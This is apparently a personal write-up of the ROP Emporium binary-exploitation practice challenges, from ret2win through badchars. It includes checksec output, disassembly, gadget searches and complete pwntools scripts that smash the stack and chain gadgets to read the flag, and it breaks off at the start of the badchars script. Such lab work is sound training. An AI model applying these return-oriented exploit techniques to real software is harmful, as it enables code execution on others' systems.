---
title: ROP Emporium
slug: ROP Emporium
tags: [Binary Exploitation, ROP Emporium]
---

![ROP Emporium](https://www.reddit.com/media?url=https%3A%2F%2Fi.redd.it%2F03pzqsvvjosd1.gif)
> I will be using `x86_64` which means 64-bit (`x86`) means 32-bit.
## Ret2Win

```bash
┌──(venv)─(at0m㉿DESKTOP-HSPMATJ)-[/mnt/…/Temp/rop/rop_emporium_all_challenges/ret2win]
└─$ checksec --file=ret2win
[*] '/mnt/c/Users/At0m/Temp/rop/rop_emporium_all_challenges/ret2win/ret2win'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

```bash
┌──(venv)─(at0m㉿DESKTOP-HSPMATJ)-[/mnt/…/Temp/rop/rop_emporium_all_challenges/ret2win]
└─$ ./ret2win
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thank you!
zsh: segmentation fault  ./ret2win
```

```python
from pwn import *

exp = process("./ret2win")
ret2win = p64(0x400756) # `Ret2Win` Address
padding = cyclic(40) # Offset
ret = p64(0x40053e) # Stack Alignment
payload = padding + ret + ret2win # Full payload
exp.sendline(payload)
print(exp.recvall().decode())
```
## Split

```bash
┌──(venv)─(at0m㉿DESKTOP-HSPMATJ)-[/mnt/…/Temp/rop/rop_emporium_all_challenges/split]
└─$ ./split
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> 222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222
Thank you!
zsh: segmentation fault  ./split

┌──(venv)─(at0m㉿DESKTOP-HSPMATJ)-[/mnt/…/Temp/rop/rop_emporium_all_challenges/split]
└─$ checksec --file=split
[*] '/mnt/c/Users/At0m/Temp/rop/rop_emporium_all_challenges/split/split'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

```bash
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000400528  _init
0x0000000000400550  puts@plt
0x0000000000400560  system@plt
0x0000000000400570  printf@plt
0x0000000000400580  memset@plt
0x0000000000400590  read@plt
0x00000000004005a0  setvbuf@plt
0x00000000004005b0  _start
0x00000000004005e0  _dl_relocate_static_pie
0x00000000004005f0  deregister_tm_clones
0x0000000000400620  register_tm_clones
0x0000000000400660  __do_global_dtors_aux
0x0000000000400690  frame_dummy
0x0000000000400697  main
0x00000000004006e8  pwnme
0x0000000000400742  usefulFunction
0x0000000000400760  __libc_csu_init
0x00000000004007d0  __libc_csu_fini
0x00000000004007d4  _fini
pwndbg> disass usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400742 <+0>:     push   rbp
   0x0000000000400743 <+1>:     mov    rbp,rsp
   0x0000000000400746 <+4>:     mov    edi,0x40084a
   0x000000000040074b <+9>:     call   0x400560 <system@plt>
   0x0000000000400750 <+14>:    nop
   0x0000000000400751 <+15>:    pop    rbp
   0x0000000000400752 <+16>:    ret
End of assembler dump.
pwndbg> x/s 0x40084a
0x40084a:       "/bin/ls"
```

We want `/bin/cat`. So lets search for it but first you need to do this in resumed program.

```bash
pwndbg> search /bin/cat
search: The program is not being run.
pwndbg> r
Starting program: /mnt/c/Users/At0m/Temp/rop/rop_emporium_all_challenges/split/split
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> ^C
Program received signal SIGINT, Interrupt.
<SNIP>
pwndbg> search /bin/cat
Searching for byte: b'/bin/cat'
split           0x601060 '/bin/cat flag.txt'
```

To link this to our system call we need to put string into `rdi` so we can find for it.

```bash
$ ROPgadget --binary split | grep "pop rdi ; ret"  
0x00000000004007c3 : pop rdi ; ret
```

We also need address of `call <system@plt>`:

```bash
pwndbg> disass usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400742 <+0>:     push   rbp
   0x0000000000400743 <+1>:     mov    rbp,rsp
   0x0000000000400746 <+4>:     mov    edi,0x40084a
   0x000000000040074b <+9>:     call   0x400560 <system@plt>
   0x0000000000400750 <+14>:    nop
   0x0000000000400751 <+15>:    pop    rbp
   0x0000000000400752 <+16>:    ret
```

which is `0x000000000040074b` and lastly find offset.

```python
from pwn import *

# --------------------------------------------------
# Step 1: Create padding to overflow the buffer
# The buffer overflows after 40 bytes (found using cyclic analysis)
padding = cyclic(40)

# --------------------------------------------------
# Step 2: Address of 'pop rdi; ret' gadget
# This is needed to control the first argument to 'system()' on x86_64.
# In x86_64, arguments are passed via registers: rdi, rsi, rdx, etc.
# We use this gadget to put the address of "/bin/cat flag.txt" into rdi.
poprdi_addr = p64(0x00000000004007c3)

# --------------------------------------------------
# Step 3: Address of the string "/bin/cat flag.txt"
# This string is already present in the .data section of the binary.
# We’ll use this as the argument to system().
bincat_addr = p64(0x601060)

# --------------------------------------------------
# Step 4: Address of the 'system()' function
# Calling system("/bin/cat flag.txt") will print the contents of flag.txt
system_addr = p64(0x000000000040074b)

# --------------------------------------------------
# Step 5: Build the full payload (ROP chain)
# 1. padding to overflow
# 2. pop rdi; ret  → prepare argument
# 3. address of "/bin/cat flag.txt" → goes into rdi
# 4. address of system() → called with rdi as arg
payload = padding + poprdi_addr + bincat_addr + system_addr

# --------------------------------------------------
# Step 6: Send the payload to the vulnerable binary
p = process('./split')     # start the target binary
p.sendline(payload)        # send the exploit payload
p.interactive()            # give us interactive shell (to see the flag)
```
## Callme

```bash
┌──(venv)─(at0m㉿DESKTOP-HSPMATJ)-[/mnt/…/Temp/rop/rop_emporium_all_challenges/callme]
└─$ checksec callme
[*] '/mnt/c/Users/At0m/Temp/rop/rop_emporium_all_challenges/callme/callme'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'.'
    Stripped:   No
```

```bash
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x00000000004006a8  _init
0x00000000004006d0  puts@plt
0x00000000004006e0  printf@plt
0x00000000004006f0  callme_three@plt
0x0000000000400700  memset@plt
0x0000000000400710  read@plt
0x0000000000400720  callme_one@plt
0x0000000000400730  setvbuf@plt
0x0000000000400740  callme_two@plt
0x0000000000400750  exit@plt
0x0000000000400760  _start
0x0000000000400790  _dl_relocate_static_pie
0x00000000004007a0  deregister_tm_clones
0x00000000004007d0  register_tm_clones
0x0000000000400810  __do_global_dtors_aux
0x0000000000400840  frame_dummy
0x0000000000400847  main
0x0000000000400898  pwnme
0x00000000004008f2  usefulFunction
0x000000000040093c  usefulGadgets
0x0000000000400940  __libc_csu_init
0x00000000004009b0  __libc_csu_fini
0x00000000004009b4  _fini

pwndbg> disass usefulFunction
Dump of assembler code for function usefulFunction:
   0x00000000004008f2 <+0>:     push   rbp
   0x00000000004008f3 <+1>:     mov    rbp,rsp
   0x00000000004008f6 <+4>:     mov    edx,0x6
   0x00000000004008fb <+9>:     mov    esi,0x5
   0x0000000000400900 <+14>:    mov    edi,0x4
   0x0000000000400905 <+19>:    call   0x4006f0 <callme_three@plt>
   0x000000000040090a <+24>:    mov    edx,0x6
   0x000000000040090f <+29>:    mov    esi,0x5
   0x0000000000400914 <+34>:    mov    edi,0x4
   0x0000000000400919 <+39>:    call   0x400740 <callme_two@plt>
   0x000000000040091e <+44>:    mov    edx,0x6
   0x0000000000400923 <+49>:    mov    esi,0x5
   0x0000000000400928 <+54>:    mov    edi,0x4
   0x000000000040092d <+59>:    call   0x400720 <callme_one@plt>
   0x0000000000400932 <+64>:    mov    edi,0x1
   0x0000000000400937 <+69>:    call   0x400750 <exit@plt>
End of assembler dump.

pwndbg> disass usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x000000000040093c <+0>:     pop    rdi
   0x000000000040093d <+1>:     pop    rsi
   0x000000000040093e <+2>:     pop    rdx
   0x000000000040093f <+3>:     ret
End of assembler dump.
```

This is what description says:

You must call the `callme_one()`, `callme_two()` and `callme_three()` functions in that order, each with the arguments `0xdeadbeef`, `0xcafebabe`, `0xd00df00d` e.g. `callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)` to print the flag. **For the x86_64 binary** double up those values, e.g. `callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`

This is a simple challenge:

```python
from pwn import *

# --------------------------------------------------
# Step 1: Start the vulnerable binary
io = process("./callme")

# --------------------------------------------------
# Step 2: Define ROP gadget address
# This gadget will let us control:
#   - RDI (1st argument)
#   - RSI (2nd argument)
#   - RDX (3rd argument)
# via: pop rdi; pop rsi; pop rdx; ret
rop_gadgets = p64(0x40093c)

# --------------------------------------------------
# Step 3: Define function addresses
# These are the target functions we need to call in order,
# each with the same 3 arguments
callme_one   = p64(0x400720)
callme_two   = p64(0x400740)
callme_three = p64(0x4006f0)

# --------------------------------------------------
# Step 4: Create initial padding to overflow the buffer
# 40 bytes to overflow up to saved RIP
payload = b"A" * 40

# --------------------------------------------------
# Step 5: First ROP chain - callme_one(0xdeadbeef..., 0xcafebabe..., 0xd00df00d...)
payload += rop_gadgets
payload += p64(0xdeadbeefdeadbeef)  # RDI
payload += p64(0xcafebabecafebabe)  # RSI
payload += p64(0xd00df00dd00df00d)  # RDX
payload += callme_one               # Call function

# --------------------------------------------------
# Step 6: Second ROP chain - callme_two(0xdeadbeef..., ...)
payload += rop_gadgets
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += callme_two

# --------------------------------------------------
# Step 7: Third ROP chain - callme_three(0xdeadbeef..., ...)
payload += rop_gadgets
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += callme_three

# --------------------------------------------------
# Step 8: Send the payload and get the result
io.sendline(payload)
print(io.clean().decode())  # Print output (should include the flag)
```
## Write4

On completing our usual checks for interesting strings and symbols in this binary we're confronted with the stark truth that our favourite string `"/bin/cat flag.txt"` is not present this time. Although you'll see later that there are other ways around this problem, such as resolving dynamically loaded libraries and using the strings present in those, we'll stick to the challenge goal which is learning how to get data into the target process's virtual address space via the magic of ROP.

```bash
┌──(venv)─(at0m㉿DESKTOP-HSPMATJ)-[/mnt/…/Temp/rop/rop_emporium_all_challenges/write4]
└─$ ./write4
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thank you!
zsh: segmentation fault  ./write4

┌──(venv)─(at0m㉿DESKTOP-HSPMATJ)-[/mnt/…/Temp/rop/rop_emporium_all_challenges/write4]
└─$ checksec write4
[*] '/mnt/c/Users/At0m/Temp/rop/rop_emporium_all_challenges/write4/write4'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'.'
    Stripped:   No
```

Things have been rearranged a little for this challenge; the printing logic has been moved into a separate library in an attempt to mitigate the alternate solution that is possible in the callme challenge. The stack smash also takes place in a function within that library, but don't worry this will have no effect on your ROP chain.

**Important!**  
A PLT entry for a function named print_file() exists within the challenge binary, simply call it with the name of a file you wish to read (like "flag.txt") as the 1st argument.

Hopefully you've realised that ROP is just a form of arbitrary code execution and if we get creative we can leverage it to do things like write to or read from memory. The question we need to answer is: what mechanism are we going to use to solve this problem? Is there any built-in functionality to do the writing or do we need to use gadgets? In this challenge we won't be using built-in functionality since that's too similar to the previous challenges, instead we'll be looking for gadgets that let us write a value to memory such as `mov [reg], reg`.

```bash
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x00000000004004d0  _init
0x0000000000400500  pwnme@plt
0x0000000000400510  print_file@plt
0x0000000000400520  _start
0x0000000000400550  _dl_relocate_static_pie
0x0000000000400560  deregister_tm_clones
0x0000000000400590  register_tm_clones
0x00000000004005d0  __do_global_dtors_aux
0x0000000000400600  frame_dummy
0x0000000000400607  main
0x0000000000400617  usefulFunction
0x0000000000400628  usefulGadgets
0x0000000000400630  __libc_csu_init
0x00000000004006a0  __libc_csu_fini
0x00000000004006a4  _fini
```

This is print file section `0x0000000000400510`.

We have to find a writable section in memory. Use `radare2` to show `rw` 
sections which means readable and writeable.

```bash
┌──(at0m㉿DESKTOP-HSPMATJ)-[/mnt/…/Temp/rop/rop_emporium_all_challenges/write4]
└─$ r2 write4
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
[0x00400520]> aaaa
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze entrypoint (af@ entry0)
INFO: Analyze symbols (af@@@s)
INFO: Analyze all functions arguments/locals (afva@@@F)
INFO: Analyze function calls (aac)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Analyzing methods (af @@ method.*)
INFO: Recovering local variables (afva@@@F)
INFO: Type matching analysis for all functions (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Scanning for strings constructed in code (/azs)
INFO: Finding function preludes (aap)
INFO: Enable anal.types.constraint for experimental type propagation
[0x00400520]> iS
[Sections]

nth paddr        size vaddr       vsize perm type        name
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000    0x0 0x00000000    0x0 ---- NULL
1   0x00000238   0x1c 0x00400238   0x1c -r-- PROGBITS    .interp
2   0x00000254   0x20 0x00400254   0x20 -r-- NOTE        .note.ABI-tag
3   0x00000274   0x24 0x00400274   0x24 -r-- NOTE        .note.gnu.build-id
4   0x00000298   0x38 0x00400298   0x38 -r-- GNU_HASH    .gnu.hash
5   0x000002d0   0xf0 0x004002d0   0xf0 -r-- DYNSYM      .dynsym
6   0x000003c0   0x7c 0x004003c0   0x7c -r-- STRTAB      .dynstr
7   0x0000043c   0x14 0x0040043c   0x14 -r-- GNU_VERSYM  .gnu.version
8   0x00000450   0x20 0x00400450   0x20 -r-- GNU_VERNEED .gnu.version_r
9   0x00000470   0x30 0x00400470   0x30 -r-- RELA        .rela.dyn
10  0x000004a0   0x30 0x004004a0   0x30 -r-- RELA        .rela.plt
11  0x000004d0   0x17 0x004004d0   0x17 -r-x PROGBITS    .init
12  0x000004f0   0x30 0x004004f0   0x30 -r-x PROGBITS    .plt
13  0x00000520  0x182 0x00400520  0x182 -r-x PROGBITS    .text
14  0x000006a4    0x9 0x004006a4    0x9 -r-x PROGBITS    .fini
15  0x000006b0   0x10 0x004006b0   0x10 -r-- PROGBITS    .rodata
16  0x000006c0   0x44 0x004006c0   0x44 -r-- PROGBITS    .eh_frame_hdr
17  0x00000708  0x120 0x00400708  0x120 -r-- PROGBITS    .eh_frame
18  0x00000df0    0x8 0x00600df0    0x8 -rw- INIT_ARRAY  .init_array
19  0x00000df8    0x8 0x00600df8    0x8 -rw- FINI_ARRAY  .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- DYNAMIC     .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- PROGBITS    .got
22  0x00001000   0x28 0x00601000   0x28 -rw- PROGBITS    .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- PROGBITS    .data
24  0x00001038    0x0 0x00601038    0x8 -rw- NOBITS      .bss
25  0x00001038   0x29 0x00000000   0x29 ---- PROGBITS    .comment
26  0x00001068  0x618 0x00000000  0x618 ---- SYMTAB      .symtab
27  0x00001680  0x1f6 0x00000000  0x1f6 ---- STRTAB      .strtab
28  0x00001876  0x103 0x00000000  0x103 ---- STRTAB      .shstrtab
```

There are some areas that are writable but not all will work, We can use `.data` section. So now we have to write `/bin/sh` and then pop `/bin/sh` into `rdi` to make syscall. We want to write to `.got.plt` section so we need to first pop data off stack into registers. We need `pop`, `mov`, `ret` instructions.

```bash
pwndbg> disass usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x0000000000400628 <+0>:     mov    QWORD PTR [r14],r15
   0x000000000040062b <+3>:     ret
   0x000000000040062c <+4>:     nop    DWORD PTR [rax+0x0]
```

Since description said to use gadgets that look like `mov [reg], reg`, its definitely this `mov    QWORD PTR [r14],r15`.

- **Locate the Gadget**: We need to find a gadget that contains the instruction `mov    QWORD PTR [r14],r15`. This will allow us to move our desired string into a writable memory segment.
- **Find a Writable Segment**: Identify a writable segment in the binary’s memory. This could be the .bss, .data, .got segment, or any other writable section.
- **Insert the String**: Once we have the writable segment, we will insert the string “flag.txt” into it.
- **Call print_file**: Finally, we will call the print_file function with the address of our writable segment to print the contents of the “flag.txt” file.

```bash
┌──(venv)─(at0m㉿DESKTOP-HSPMATJ)-[/mnt/…/Temp/rop/rop_emporium_all_challenges/write4]
└─$ ROPgadget --binary ./write4
Gadgets information
============================================================
<SNIP>
0x0000000000400690 : pop r14 ; pop r15 ; ret
```

We need this above gadget so we can pop values into registers for inserting our string. We also know that `print_file` function takes the argument. So we need one more `rdi` register to pass it as argument which will be `flag.txt`.

```bash
┌──(venv)─(at0m㉿DESKTOP-HSPMATJ)-[/mnt/…/Temp/rop/rop_emporium_all_challenges/write4]
└─$ ROPgadget --binary ./write4 | grep rdi
0x0000000000400693 : pop rdi ; ret
```

And obviously offset also which is `40`.

```python
from pwn import *

# --------------------------------------------------
# Step 1: Define target binary and start the process
io = process('./write4')

# --------------------------------------------------
# Step 2: Define useful gadgets and function addresses

# Gadget: pop r14 ; pop r15 ; ret
#   - Used to control both r14 (destination) and r15 (value to store)
pop_r14_r15 = 0x400690

# Gadget: mov qword ptr [r14], r15 ; ret
#   - Writes value in r15 to memory pointed by r14
mov_r14_r15 = 0x400628

# Gadget: pop rdi ; ret
#   - Used to control the 1st argument to a function (RDI)
pop_rdi = 0x400693

# Address: .data section
#   - Writable memory where we'll place "flag.txt"
data_section = 0x601028

# Function: print_file@plt
#   - Function to call with RDI pointing to "flag.txt"
print_file = 0x400510

# --------------------------------------------------
# Step 3: Create initial padding to reach return address
# 40 bytes needed to overflow the buffer up to saved RIP
payload = b"A" * 40

# --------------------------------------------------
# Step 4: Write "flag.txt" into .data section using ROP chain
#   1. pop r14 ; pop r15 ; ret
#   2. r14 = data_section, r15 = b"flag.txt"
#   3. mov qword ptr [r14], r15 ; ret

payload += p64(pop_r14_r15)          # Gadget to control r14 and r15
payload += p64(data_section)         # r14 = destination address
payload += b"flag.txt"               # r15 = string to write
payload += p64(mov_r14_r15)          # Perform *r14 = r15

# --------------------------------------------------
# Step 5: Set up argument and call print_file
#   1. pop rdi ; ret
#   2. rdi = data_section (which now holds "flag.txt")
#   3. call print_file@plt

payload += p64(pop_rdi)              # Gadget to set rdi
payload += p64(data_section)         # rdi = address of "flag.txt"
payload += p64(print_file)           # call print_file("flag.txt")

# --------------------------------------------------
# Step 6: Send payload and interact with the process
io.sendline(payload)
io.interactive()
```
## Badchars

Dealing with bad characters is frequently necessary in exploit development, you've probably had to deal with them before while encoding shellcode. "Badchars" are the reason that encoders such as shikata-ga-nai exist. When constructing your ROP chain remember that the badchars apply to _every_ character you use, not just parameters but addresses too. **To mitigate the need for too much RE the binary will list its badchars when you run it.**

ropper has a bad characters option to help you avoid using gadgets whose address will terminate your chain prematurely, it will certainly come in handy. **Note that the amount of garbage data you'll need to send to the ARM challenge is slightly different.**

You'll still need to deal with writing a string into memory, similar to the write4 challenge, that may have badchars in it. Once your string is in memory and intact, just use the `print_file()` method to print the contents of the flag file, just like in the last challenge. Think about how we're going to overcome the badchars issue; should we try to avoid them entirely, or could we use gadgets to change our string once it's in memory?

It's almost certainly worth your time writing a helper function for this challenge. Perhaps one that takes as parameters a string, a desired location in memory and an array of badchars. It could then write the string into memory and deal with the badchars afterwards. There's always a chance you could find a string that does what you want and doesn't contain any badchars either.

```bash
┌──(at0m㉿DESKTOP-HSPMATJ)-[/mnt/…/Temp/rop/rop_emporium_all_challenges/barchar]
└─$ ./badchars
badchars by ROP Emporium
x86_64

badchars are: 'x', 'g', 'a', '.'
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thank you!
zsh: segmentation fault  ./badchars

┌──(venv)─(at0m㉿DESKTOP-HSPMATJ)-[/mnt/…/Temp/rop/rop_emporium_all_challenges/barchar]
└─$ checksec badchars
[*] '/mnt/c/Users/At0m/Temp/rop/rop_emporium_all_challenges/barchar/badchars'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'.'
    Stripped:   No
```

```bash
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x00000000004004d8  _init
0x0000000000400500  pwnme@plt
0x0000000000400510  print_file@plt
0x0000000000400520  _start
0x0000000000400550  _dl_relocate_static_pie
0x0000000000400560  deregister_tm_clones
0x0000000000400590  register_tm_clones
0x00000000004005d0  __do_global_dtors_aux
0x0000000000400600  frame_dummy
0x0000000000400607  main
0x0000000000400617  usefulFunction
0x0000000000400628  usefulGadgets
0x0000000000400640  __libc_csu_init
0x00000000004006b0  __libc_csu_fini
0x00000000004006b4  _fini
pwndbg>
All defined functions:

Non-debugging symbols:
0x00000000004004d8  _init
0x0000000000400500  pwnme@plt
0x0000000000400510  print_file@plt
0x0000000000400520  _start
0x0000000000400550  _dl_relocate_static_pie
0x0000000000400560  deregister_tm_clones
0x0000000000400590  register_tm_clones
0x00000000004005d0  __do_global_dtors_aux
0x0000000000400600  frame_dummy
0x0000000000400607  main
0x0000000000400617  usefulFunction
0x0000000000400628  usefulGadgets
0x0000000000400640  __libc_csu_init
0x00000000004006b0  __libc_csu_fini
0x00000000004006b4  _fini
pwndbg> disass usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400617 <+0>:     push   rbp
   0x0000000000400618 <+1>:     mov    rbp,rsp
   0x000000000040061b <+4>:     mov    edi,0x4006c4
   0x0000000000400620 <+9>:     call   0x400510 <print_file@plt>
   0x0000000000400625 <+14>:    nop
   0x0000000000400626 <+15>:    pop    rbp
   0x0000000000400627 <+16>:    ret
End of assembler dump.d.
pwndbg> disass usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x0000000000400628 <+0>:     xor    BYTE PTR [r15],r14b
   0x000000000040062b <+3>:     ret
   0x000000000040062c <+4>:     add    BYTE PTR [r15],r14b
   0x000000000040062f <+7>:     ret
   0x0000000000400630 <+8>:     sub    BYTE PTR [r15],r14b
   0x0000000000400633 <+11>:    ret
   0x0000000000400634 <+12>:    mov    QWORD PTR [r13+0x0],r12
   0x0000000000400638 <+16>:    ret
   0x0000000000400639 <+17>:    nop    DWORD PTR [rax+0x0]
End of assembler dump.
pwndbg>
```

In `usefulGadgets`, ` mov    QWORD PTR [r13+0x0],r12` can be used to copy string `flag.txt` and store in `r12`. ` xor    BYTE PTR [r15],r14b` its also interesting.

Lets also inspect shared library.

```bash
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000000750  _init
0x0000000000000780  puts@plt
0x0000000000000790  fclose@plt
0x00000000000007a0  printf@plt
0x00000000000007b0  memset@plt
0x00000000000007c0  read@plt
0x00000000000007d0  fgets@plt
0x00000000000007e0  setvbuf@plt
0x00000000000007f0  fopen@plt
0x0000000000000800  exit@plt
0x0000000000000810  __cxa_finalize@plt
0x0000000000000820  deregister_tm_clones
0x0000000000000860  register_tm_clones
0x00000000000008b0  __do_global_dtors_aux
0x00000000000008f0  frame_dummy
0x00000000000008fa  pwnme
0x0000000000000a07  print_file
0x0000000000000a94  _fini
```

In `badchars` binary:

```bash
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x00000000004004d8  _init
0x0000000000400500  pwnme@plt
0x0000000000400510  print_file@plt
0x0000000000400520  _start
0x0000000000400550  _dl_relocate_static_pie
0x0000000000400560  deregister_tm_clones
0x0000000000400590  register_tm_clones
0x00000000004005d0  __do_global_dtors_aux
0x0000000000400600  frame_dummy
0x0000000000400607  main
0x0000000000400617  usefulFunction
0x0000000000400628  usefulGadgets
0x0000000000400640  __libc_csu_init
0x00000000004006b0  __libc_csu_fini
0x00000000004006b4  _fini
```

`pwnme` and `print_file` are loaded in PLT which means they are from `libbadchars.so` shared library.

This is like previous one but only difference is we have to avoid bad characters for which we can use ` xor    BYTE PTR [r15],r14b` gadget by sending XORed of `flag.txt` with key to remove `a`, `g`, `x` and `.` and then XOR it again using gadget to recover original string. Like previous we also need `pop` gadget.

These are properties of XOR:

```
Commutative: A ⊕ B = B ⊕ A  
Associative: A ⊕ (B ⊕ C) = (A ⊕ B) ⊕ C  
Identity: A ⊕ 0 = A  
Self-Inverse: A ⊕ A = 0
```

We can use `A` as our `flag.txt` string and `B` as `key`.

We can use Self-Inverse + Identity property like since XOR is reversible:

```
A ⊕ B = C     →     C ⊕ B = A
```

So if:

```
encoded_char = original_char ⊕ key
```

Then:

```
original_char = encoded_char ⊕ key
```

That’s why it works: **applying XOR twice with the same key restores the original**.

First like before find section to write.

```bash
$ r2 badchars
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
[0x00400520]> aaa
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze entrypoint (af@ entry0)
INFO: Analyze symbols (af@@@s)
INFO: Analyze all functions arguments/locals (afva@@@F)
INFO: Analyze function calls (aac)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Analyzing methods (af @@ method.*)
INFO: Recovering local variables (afva@@@F)
INFO: Type matching analysis for all functions (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Use -AA or aaaa to perform additional experimental analysis
[0x00400520]> iS
[Sections]

nth paddr        size vaddr       vsize perm type        name
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000    0x0 0x00000000    0x0 ---- NULL
1   0x00000238   0x1c 0x00400238   0x1c -r-- PROGBITS    .interp
2   0x00000254   0x20 0x00400254   0x20 -r-- NOTE        .note.ABI-tag
3   0x00000274   0x24 0x00400274   0x24 -r-- NOTE        .note.gnu.build-id
4   0x00000298   0x38 0x00400298   0x38 -r-- GNU_HASH    .gnu.hash
5   0x000002d0   0xf0 0x004002d0   0xf0 -r-- DYNSYM      .dynsym
6   0x000003c0   0x7e 0x004003c0   0x7e -r-- STRTAB      .dynstr
7   0x0000043e   0x14 0x0040043e   0x14 -r-- GNU_VERSYM  .gnu.version
8   0x00000458   0x20 0x00400458   0x20 -r-- GNU_VERNEED .gnu.version_r
9   0x00000478   0x30 0x00400478   0x30 -r-- RELA        .rela.dyn
10  0x000004a8   0x30 0x004004a8   0x30 -r-- RELA        .rela.plt
11  0x000004d8   0x17 0x004004d8   0x17 -r-x PROGBITS    .init
12  0x000004f0   0x30 0x004004f0   0x30 -r-x PROGBITS    .plt
13  0x00000520  0x192 0x00400520  0x192 -r-x PROGBITS    .text
14  0x000006b4    0x9 0x004006b4    0x9 -r-x PROGBITS    .fini
15  0x000006c0   0x10 0x004006c0   0x10 -r-- PROGBITS    .rodata
16  0x000006d0   0x44 0x004006d0   0x44 -r-- PROGBITS    .eh_frame_hdr
17  0x00000718  0x120 0x00400718  0x120 -r-- PROGBITS    .eh_frame
18  0x00000df0    0x8 0x00600df0    0x8 -rw- INIT_ARRAY  .init_array
19  0x00000df8    0x8 0x00600df8    0x8 -rw- FINI_ARRAY  .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- DYNAMIC     .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- PROGBITS    .got
22  0x00001000   0x28 0x00601000   0x28 -rw- PROGBITS    .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- PROGBITS    .data
24  0x00001038    0x0 0x00601038    0x8 -rw- NOBITS      .bss
25  0x00001038   0x29 0x00000000   0x29 ---- PROGBITS    .comment
26  0x00001068  0x618 0x00000000  0x618 ---- SYMTAB      .symtab
27  0x00001680  0x1f8 0x00000000  0x1f8 ---- STRTAB      .strtab
28  0x00001878  0x103 0x00000000  0x103 ---- STRTAB      .shstrtab
```

We will use `.bss` this time and its size is `0x8` bytes, exactly size of `flag.txt` string. 

```python
from pwn import *

elf = context.binary = ELF("badchars")
rop = ROP(elf)

